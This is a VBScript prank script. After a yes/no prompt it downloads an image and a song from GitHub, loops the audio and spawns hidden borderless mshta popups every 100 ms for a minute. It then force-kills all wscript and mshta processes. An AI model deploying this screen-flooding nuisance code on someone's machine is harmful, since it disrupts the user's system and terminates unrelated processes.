Option Explicit
Randomize
Dim wsh,iUrl,sUrl,iv,w,h,tmp,img,mp,fso,x,st,pl,t0,u,p,html
Set wsh=CreateObject("WScript.Shell")
iUrl="https://github.com/aqualog7/14/raw/refs/heads/main/14.png"
sUrl="https://github.com/aqualog7/14/raw/refs/heads/main/14.mp3"
iv=100
w=453: h=255
If MsgBox(ChrW(191)&"tienes 14?",vbYesNo+vbQuestion,"Pregunta")=vbNo Then WScript.Quit
Set fso=CreateObject("Scripting.FileSystemObject")
tmp=wsh.ExpandEnvironmentStrings("%TEMP%")
img=tmp & "\img" & Replace(CStr(Timer),".","") & ".png"
mp=tmp & "\mp" & Replace(CStr(Timer),".","") & ".mp3"
Set x=CreateObject("MSXML2.ServerXMLHTTP.6.0")
x.open "GET",iUrl,false
x.send
If x.Status=200 Then Set st=CreateObject("ADODB.Stream"):st.Type=1:st.Open:st.Write x.responseBody:st.SaveToFile img,2:st.Close
x.open "GET",sUrl,false
x.send
If x.Status=200 Then Set st=CreateObject("ADODB.Stream"):st.Type=1:st.Open:st.Write x.responseBody:st.SaveToFile mp,2:st.Close
On Error Resume Next
Set pl=CreateObject("WMPlayer.OCX")
If Err.Number=0 Then pl.URL=mp:pl.settings.setMode "loop",True:pl.controls.play
On Error GoTo 0
t0=Timer
Do
 u=Replace(CStr(Timer),".","")&Int(Rnd*1000)
 p=tmp & "\p" & u & ".hta"
 html="<html><head><hta:application border='none' caption='no' showInTaskbar='no' sysMenu='no'></hta:application><script>window.onload=function(){window.resizeTo(" & w & "," & h & ");var r=function(a,b){return Math.floor(Math.random()*(b-a+1))+a};window.moveTo(r(0,screen.availWidth-" & w & "),r(0,screen.availHeight-" & h & "));setTimeout(function(){window.close();},60000)};</script></head><body style='margin:0;overflow:hidden'><img src='file:///" & Replace(img,"\","/") & "' style='width:100%;height:100%;object-fit:cover;border:0'></body></html>"
 With fso.CreateTextFile(p,True)
  .Write html
  .Close
 End With
 wsh.Run "mshta """ & p & """",0,false
 WScript.Sleep iv
 If Timer - t0 >= 60 Then wsh.Run "cmd /c taskkill /f /IM wscript.exe & taskkill /f /IM mshta.exe",0,false: Exit Do
Loop